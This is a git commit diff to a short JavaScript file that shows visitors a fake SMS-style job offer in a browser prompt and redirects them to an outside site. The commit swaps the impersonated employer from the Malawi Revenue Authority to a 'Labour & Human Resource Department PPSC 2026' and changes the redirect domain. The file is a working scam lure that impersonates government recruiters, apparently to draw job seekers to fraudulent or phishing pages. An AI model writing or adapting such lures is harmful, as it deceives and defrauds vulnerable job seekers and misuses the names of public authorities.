03c764876b3cca4e6fab2e7838dfeefb8e39a748
sweet16palz-hub <sweet16palz@gmail.com>
2026-03-08 03:51:58 -0700

    Update mra-active.js

--- mra-active.js
+++ mra-active.js
@@ -1,5 +1,5 @@
 var password = 'APPLY NOW'
-password=prompt('SMS: Congratulation. You are among the selected ones to work with Malawi Revenue Authority 2026, kindly press Ok to submit application ','APPLY NOW');
+password=prompt('SMS: Congratulation. You are among the selected ones to work with Labour & Human Resource Department PPSC 2026, kindly press Ok to submit application ','APPLY NOW');
 if (password != 'APPLY NOW') {
-location.href='https://gudoffer.org/mra.html';
+location.href='https://gbamz.com/ppsc.html';
 }
